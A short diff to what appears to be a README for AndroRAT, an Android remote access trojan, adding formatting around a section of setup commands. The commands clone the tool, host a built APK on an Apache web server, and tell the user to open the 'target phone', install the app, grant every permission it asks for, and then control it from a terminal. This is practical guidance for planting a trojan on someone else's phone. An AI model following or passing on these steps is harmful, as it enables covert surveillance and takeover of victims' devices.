@@ -116,6 +116,7 @@ In the sh shell there are some sub commands
 
 
 ## Commands From Starting - Examples
+'''
 git clone https://github.com/karma9874/AndroRAT.git
 cd AndroRAT
 pip install -r requirements.txt
@@ -130,3 +131,4 @@ sudo systemctl start apache2.service
 sudo cp <YOUR FILE NAME>.apk /var/www/html/
 
 OPEN YOUR TARGET PHONE AND ENTER THE IP ADDRESS IN WHICH YOU ARE RUNNING THE PROGRAM. THEN, DOWNLOAD IT AND ENTER OEPN IN YOUR TARGET PHONE AND GIVE ACCESS TO WHATEVER THE APP ASKS> THEN> GO TO THE 1ST TRMINAL AND TYPE help AND YOU ARE GOOF TOP GO!
+'''
